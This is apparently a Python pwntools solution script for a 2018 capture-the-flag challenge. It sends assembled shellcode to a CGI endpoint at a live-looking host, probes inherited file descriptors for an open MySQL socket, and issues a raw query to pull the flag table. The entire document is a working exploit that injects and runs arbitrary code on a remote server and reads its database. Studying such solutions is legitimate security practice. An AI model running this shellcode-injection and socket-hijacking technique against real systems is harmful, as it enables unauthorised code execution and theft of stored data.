import requests, re
from pwn import *

context(arch='amd64', os='linux')

#URL = 'http://b9d6d408.quals2018.oooverflow.io/cgi-bin/index.php'
URL = 'http://ssat-ps.iptime.org:5103/cgi-bin/index.php'

print "fd write test(3~9)"
fd = []
for i in range(3, 10):
	msg = "A" * 8
	payload = shellcraft.echo("Content-type: text/html\n\n", 1)		#cgi header
	payload += shellcraft.write(i, msg, len(msg))
	payload += "add eax, 48\n"
	payload += "mov [rsp], rax\n"
	payload += shellcraft.write(1, 'rsp', 1)

	data = {'shell': asm(payload)}

	res = requests.post(URL, data=data)
	if res.text == str(len(msg)):
		print "%d is alive!"%i
		fd.append(i)

print "\nfd read test for writable ports"
for i in fd:
	msg = "A" * 8
	payload = shellcraft.echo("Content-type: text/html\n\n", 1)		#cgi header
	payload += shellcraft.write(i, msg, len(msg))
	payload += shellcraft.read(i, 'rsp', 10)
	payload += shellcraft.write(1, 'rsp', 'rax')
	
	data = {'shell': asm(payload)}

	res = requests.post(URL, data=data)
	if len(res.text) > 0:
		print "%d is available."%i
		mysql_port = i

print "\nget query result"
msg = "\x03" + "select * from flag"								#COM-QUERY format
msg = p32(len(msg)) + msg
payload = shellcraft.echo("Content-type: text/html\n\n", 1)		#cgi header
payload += shellcraft.write(mysql_port, msg, len(msg))
payload += shellcraft.read(mysql_port, 'rsp', 200)
payload += shellcraft.write(1, 'rsp', 'rax')

data = {'shell': asm(payload)}

res = requests.post(URL, data=data)
pattern = re.compile(r'OOO{.+}')
print re.search(pattern, res.text).group()

